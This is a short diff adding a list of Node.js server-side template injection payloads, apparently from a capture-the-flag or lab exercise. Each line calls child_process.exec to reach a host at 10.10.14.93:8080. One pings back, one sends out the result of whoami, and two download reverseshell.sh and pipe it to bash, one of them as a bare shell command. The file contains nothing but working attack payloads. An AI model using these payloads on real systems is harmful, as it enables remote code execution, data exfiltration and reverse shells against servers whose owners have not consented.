@@ -1,0 +1,7 @@
+{{ process.mainModule.require('child_process').exec('wget 10.10.14.93:8080') }}
+
+{{ process.mainModule.require('child_process').exec('wget "10.10.14.93:8080/whoami?user=$(whoami)"') }}
+
+
+wget -qO- http://10.10.14.93:8080/reverseshell.sh | bash
+{{ process.mainModule.require('child_process').exec('wget -qO- http://10.10.14.93:8080/reverseshell.sh | bash') }}
